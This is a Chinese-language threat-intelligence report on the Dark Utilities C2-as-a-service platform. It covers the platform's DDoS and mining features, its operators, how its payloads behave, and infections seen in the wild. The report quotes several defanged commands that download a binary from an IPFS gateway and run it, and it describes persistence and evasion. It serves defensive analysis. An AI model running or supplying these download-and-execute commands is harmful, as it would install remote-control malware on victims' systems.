> **关键词**

> Dark Utilities、C2aaS、DDoS、加密货币挖掘、IPFS

1\. 执行摘要  
  

*   Dark Utilities于 2022 年初发布，是一个为攻击者提供全功能 C2 功能的平台。
    
*   它被宣传为一种在受感染系统上启用远程访问、命令执行、分布式拒绝服务（DDoS）攻击和加密货币挖掘行为的手段。
    
*   该平台提供的有效载荷支持Windows、Linux 和基于 Python 的实现，并托管在星际文件系统（IPFS）中，使其能够适应内容审核或执法干预。
    
*   自最初发布以来，作者团队已经观察到恶意软件样本在野外利用它来促成远程访问和加密货币挖掘。
    

2\. Dark Utilities是什么？  
  

2022年初，一个名为“Dark Utilities”的新C2平台成立，并提供远程系统访问、DDoS功能和加密货币挖掘等多种服务。该服务的操作者还建立了 Discord 和 Telegram 社区，为平台上的客户提供技术支持和帮助。

![](../Images/67c9058f875f50ee2d099b9f7de06ed9.png)

![](../Images/37ef99f8203a2302875d5f24f0dc18ed.png)

Dark Utilities 提供由在受害系统上执行的代码组成的有效载荷，允许它们向服务注册并建立命令和控制（C2）通讯渠道。该平台目前支持Windows、Linux 和基于 Python 的有效载荷，允许攻击者针对多种架构而无需大量的开发资源。在作者团队的分析过程中，他们观察到这个平台不断地有正在进行的开发活动。这个平台正在努力扩展操作系统和系统架构的支持。

该平台托管在因特网明网和Tor暗网上，以 9.99 欧元的价格售卖对该平台、相关有效载荷和 API 端点的高级访问权限。在撰写本文时，该平台已注册大约 3,000 名用户，收入约为 30,000 欧元。鉴于与其提供的功能数量比起来相对低廉的价格，该平台可能会很吸引那些试图破坏系统而不想在他们的恶意软件有效载荷中创建自己的 C2 实现的攻击者。

![](../Images/df39bb5af65d69d6b98b486449eba279.png)

几乎在第一时间，作者团队观察到恶意软件样本在野外使用这种服务作为在受感染系统上建立C2通信渠道和建立远程访问功能的一种方式。作者团队已经观察到针对Windows和Linux系统的恶意软件利用了Dark Utilities。

3\. Dark Utilities平台的功能  
  

Dark Utilities 平台利用 Discord 进行用户身份验证。通过身份验证后，用户就会看到一个仪表板，其中显示了关于平台健康状态、服务器健康状态以及其他指标等各种统计数据。

![](../Images/4f07aba4ae74317e43458cd618db7c96.png)

要向该服务注册新的僵尸主机，必须生成有效载荷并将其部署在受害机器上。在撰写本文时，该平台支持多种操作系统，如下面的有效载荷选择下拉菜单所示。

![](../Images/1a50092eeb10154c17a79016807ce53d.png)

选择一个操作系统后，平台会生成命令字符串。攻击者通常将其嵌入到 PowerShell 或 Bash 脚本中，以便于受害者机器获取和执行有效载荷。下面展示了一个针对 Windows 操作系统的有效载荷的样例。

| cd %userprofile%\\Documents && mkdir Steam &&  cd .\\Steam &&  curl hxxps\[:\]//ipfs\[.\]infura\[.\]io/ipfs/QmRLaPCGa2HZTxMPQxU2VnB9qda3mUv21TXrjbMNqkxN6Z >> launcher.exe &&  .\\launcher.exe \[ACCOUNT\_STRING\_PARAMETER\] |
| --- |

对于基于 Linux 的有效载荷，样例命令字符串是：

| cd /tmp/;curl hxxps\[:\]//ipfs\[.\]infura\[.\]io/ipfs/QmVwqSG7TGceZJ6MWnKgYkiyqnW4qTTRq61ADDfMJaPEoG > ./tcp-client;chmod +x tcp-client; ./tcp-client \[ACCOUNT\_STRING\_PARAMETER\] |
| --- |

最近，该平台增加了对 ARM64 和 ARMV71 等其他架构的支持。该平台将其描述为可用于针对各种嵌入式设备，如路由器、电话和物联网（IoT）设备，如下所示。

![](../Images/83ffa52ef64bc75906068addd9169ae7.png)

使用 IPFS 来托管有效载荷二进制文件可提供针对内容审核或删除的韧性，因为 IPFS 是一个分布式的点对点网络，明确旨在防止中央机构对托管在那里的内容采取措施。IPFS 支持使用IPFS 网关，它的操作类似于 Tor2Web 网关，它允许 Internet 上的用户访问 IPFS 中托管的内容，而用户无需安装客户端应用程序，攻击者越来越多地利用此基础架构进行有效载荷托管和分发。下面是保持维护的 IPFS 网关的公开列表。

![](../Images/0fc26ac58a6c259ad5fd9b006963ae6c.png)

对于已在 Dark Utilities 平台上注册的管理员僵尸主机，提供了一个名为“管理器”的管理面板。该面板列出了这个帐户控制下的系统，并提供了几个内置模块，使用它们可以进行拒绝服务攻击、执行加密货币挖掘以及跨其控制的系统执行命令。

![](../Images/f0f5dc44636feb5b6f4a66aa8b71a217.png)

该平台提供了内置接口来进行两种不同类型的 DDoS 攻击，这两种攻击都支持多种方法。在网络层第 4 层支持 TCP、UDP 和 ICMP，同时也有一些是专门针对某些特定的游戏平台的，例如 Teamspeak3、Fivem、GMOD 和 Valve 等，除此之外还有专门针对特定的游戏的，例如“反恐精英：全球攻势”和“Among Us”等。在网络层第 7 层支持 GET、POST、HEAD、PATCH、PUT、DELETE、OPTIONS 和 CONNECT 方法。该界面包含分别用于配置第 4 层和第 7 层 DDoS 攻击的表单，如下图所示。

![](../Images/2cb779802c58034cb00b27b3f4698bd2.png)

加密货币挖掘功能利用 pool\[.\]hashvault\[.\]pro 来进行门罗币挖掘，使用这个功能只需要提供攻击者的门罗币钱包地址。

![](../Images/1948a73ebf476aa2718c4df2f02204a5.png)

该平台还提供分布式命令执行以及一个可以同时针对大量系统来运行的 Discord 抓取器。

![](../Images/b7247d2a7f9d1e36c163215cb5c6efa5.png)

![](../Images/0ff183b7b023bcd9397a4f29462c72ff.png)

内置的 Python 解释器允许攻击者从平台管理面板中定义要在其控制的系统上执行的 Python 脚本。

![](../Images/0de7e6b7c0df72a02b0df83c6b69e9fe.png)

4\. Dark Utilities 的幕后黑手  
  

![](../Images/885cafccb95ba7272028311f098b8e3c.png)

Dark Utilities 似乎是由一个名为 Inplex-sys 的团伙创立和管理。仔细研究这个团伙的历史，尽管可以观察到 inplex-sys 也用英语进行交流，但作者团队发现了几个他们声称自己会说法语的实例。inplex-sys 在网络犯罪的地下空间的历史并不长。除了在 Hack Forums 平台上的简短互动外，inplex-sys 将他们的活动限制在 Telegram 和 Discord 等消息或机器人平台上。该平台启动后不久，作者团队观察到 inplex-sys 在 Lapsus$ 组织（最近有几名成员被捕的高调的攻击者）的Telegram 频道内为它做广告。

作者团队还在名为 Doxbin 的 doxxing服务上找到了 inplex-sys 的记录，这表明他们的位置在德国。作者团队评估这个 Doxbin 条目要么是不正确的，要么是故意作为诱饵发布的，而他们其实位于法国。基于有限的交互和其他行为的启示，看起来 inplex-sys 确实是 Dark Utilities 背后的主要人物，但是没有迹象表明他们是独立地管理和开发这个平台的。

作者团队观察到游戏商店 Steam 上也有人使用了相同的名字，并宣传了 Dark Utilities 服务和其他服务，并带有指向其各自网站的链接。

![](../Images/cfcabd0111cc62381345cf45df1a3056.png)

Smart Bot 是一个机器人管理平台，旨在用于发起垃圾邮件攻击，或针对 Discord 和 Twitch 通信平台的“突袭”。这些攻击通常是通过使用大量垃圾邮件充斥平台来破坏合法通信，这可能会导致流媒体收入损失。上传到 YouTube 的演示视频展示了该工具针对 Twitch 上流媒体的行为。

![](../Images/7f6acbfd5dd789234ed0178e2e10fb4e.png)

Smart Bot 项目列出的其他项目创建者似乎与 inplex-sys 有合作关系，其中一位 Smart Bot 创建者最近发布了一个 GitHub 存储库，其中包含一个用来和 Dark Utilities 平台交互的 NodeJS API 工具。

5\. Dark Utilities有效载荷分析  
  

Dark Utilities 有效载荷包含一个 Python 脚本，该脚本已编译为 Windows PE32+ 可执行文件或 Linux ELF 可执行文件。作者团队反编译了这些二进制文件并获得有效载荷的原始 Python 源代码。

在分析期间可用的 Linux 有效载荷实际上并不需要前面所说的运行参数。如果在启动可执行文件时未指定任何参数，则它将僵尸主机与默认所有者相关联，有可能是与平台开发人员相关联。

![](../Images/031a8df346398551ce807f1c7b8c216e.png)

Python 脚本包含适用于Windows 和基于 Linux 的系统的代码。脚本首先识别它所运行的系统的体系结构、CPU 信息和其他系统详细信息。然后，它会确定是否可以通过与 Dark Utilities API 通信来更新有效载荷，以获取可用的最新版本信息，以便与系统上当前运行的版本进行比较。

![](../Images/ca67136514e7eacb79670687d9f11c1e.png)

如果更新的有效载荷可用，恶意软件将通过 IPFS 网关获取它，这与之前描述的过程类似。

![](../Images/e5dc665a490fc8c8cf7699281118eca4.png)

接下来，有效载荷尝试在系统上实现持久性，使系统允许它在系统重新启动后执行。如果被感染的系统是 Windows，恶意软件会创建一个注册表运行键，如下图所示。

![](../Images/0485255818c33944e373c4cb9b7d3b88.png)

如果系统是 Linux 兼容系统，恶意软件将尝试定位并删除任何现有的Kinsing恶意软件并清除现有的 Crontab 配置。

![](../Images/723a485946210efc64be6fb2a8cc1d42.png)

然后它将创建一个 Crontab 条目或一个 Systemd 服务，以确保在系统重新启动后启动有效载荷。

![](../Images/33bc74358a925866575eced842726d35.png)

作者团队观察到，在所分析的版本中，在建立持久性机制时将系统与特定 Dark Utilities 帐户关联的字母数字字符串是未定义的。这导致恶意软件在系统重新启动后使用前面描述的默认帐户字符串。在 Windows 和 Linux 系统上都观察到此问题。

该脚本还包含负责激活各种有效载荷功能的代码，例如加密货币挖掘、DDoS 攻击等。如果部署了 Monero 挖掘选项，恶意软件将通过 IPFS 网关获取XMRig 并在系统上执行它。该恶意软件使用 Hashvault 矿池，并根据受感染系统的操作系统设置最大 CPU 使用率值。

![](../Images/3cc0ea2707c340fcb08136f0f512bb93.png)

如果在受感染的机器上启动任务管理器，恶意软件会尝试通过终止挖矿进程来逃避检测。

![](../Images/a3199ab3e10cca1c03260caeebdf84b7.png)

该脚本还定义了一个名为 Attack 的类，其中包含第 4 层和第 7 层 DDoS 攻击载荷的子类，可以通过前面描述的管理面板进行配置和激活。以下是脚本中定义的针对各种游戏服务器（如“CS:GO”、“AmongUs”和 TeamSpeak）的有效载荷的一些示例。

![](../Images/1e5ca43cfe5bea9573edf60948f87fde.png)

该恶意软件使用以下代码来处理用平台管理面板中提供的 shell 执行任意系统命令的功能。它还支持通过平台提供的接口搜索受感染机器的文件系统。攻击者指定的 Python 代码也可以由恶意软件有效载荷执行。

6\. 利用Dark Utilities  
  

自该平台于 2022 年初建立以来，作者团队观察到了各种利用 Dark Utilities 进行 C2 通信的恶意软件样本。这包括针对 Windows 和 Linux 操作系统的恶意软件。

在一个示例中，阶段 1 有效载荷是一个可执行文件，它负责在 %TEMP% 目录的子文件夹中释放一个 PowerShell 脚本，而这个子文件夹也是在阶段 1 执行期间创建的。

![](../Images/72a70cfc831928dcc8d985e9be6748f1.png)

然后按如下方式执行 PowerShell：

| "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe" –NoProfile -ExecutionPolicy Bypass -File C:\\Users\\\[USERNAME\]\\AppData\\Local\\Temp\\78E6.tmp\\7916.tmp\\7956.ps1  
 |
| --- |

PowerShell 负责通过 IPFS 获取Dark Utilities 有效载荷并在系统上执行它。

![](../Images/ce466f8698e594d0599506045020dba6.png)

使用的 PowerShell 语法示例如下所示。

| cd C:\\Users\\$env:UserName\\Documents\\;mkdir Github;cd C:\\Users\\$env:UserName\\Documents\\GitHub\\;$uri = ('hxxps\[:\]//ipfs\[.\]infura\[.\]io/ipfs/QmbGk4XnFSY8cn4uHjNq6891uLL1zoPbmTigj7YFyPqA2x');curl $uri -o tcp-client.exe; .\\tcp-client.exe M0ImZlMzJldIRzFHcSRIMilAKkkwZi8 |
| --- |

第 2 阶段有效载荷（Dark Utilities Windows 有效载荷）存储在 PowerShell 创建的 Documents 文件夹的子目录中。接下来会执行有效载荷并传递攻击者的字母数字字符串。这会导致系统在攻击者的 Dark Utilities 帐户下注册，从而授予攻击者对受感染系统的完全控制权。在这种情况下，Dark Utilities 平台是通过 Tor2Web 网关访问的，该网关使受感染的系统能够与 Dark Utilities 进行通信，而无需安装 Tor 客户端。

作者团队也观察到针对 Linux 等其他操作系统的类似实现，其中攻击者利用 shell 脚本来执行有效载荷获取和执行，类似于下面展示的示例：

![](../Images/cd18d7e959906684c94abfef7380feea.png)

在许多情况下，作为参数传递的字母数字字符串因样本而异，这可能表明多个不同的威胁参与者正在采用这种方法来获取受感染系统上的 C2。随着时间的推移，C2 平台本身已经跨越了各种顶级域名（TLD）。作者团队观察到当样本托管在 ME、XYZ 和 PW 顶级域名上时，样本试图从不同的站点获取有效载荷。

7\. 结论  
  

虽然 Dark Utilities 平台是最近建立的，但已经有数千名用户注册并加入了该平台。鉴于平台提供的功能数量和相对较低的使用成本，作者团队预计该平台将继续快速扩大其用户群体。这可能会导致在野外试图利用该平台建立C2的恶意软件样本数量增加。企业应该了解这些C2aaS平台，并确保他们有安全控制措施来帮助保护其环境。这些平台为攻击者提供了各种复杂的能力，否则他们可能无法自行开发出这种平台。它们有效地降低了网络犯罪分子进入威胁领域的门槛，使得他们能够快速开始针对各种操作系统发起攻击。它们还提供了多种方法，可用于进一步将在企业环境中获得的系统访问权货币化，并可能导致在获得初始访问权后进一步在环境中部署恶意软件。
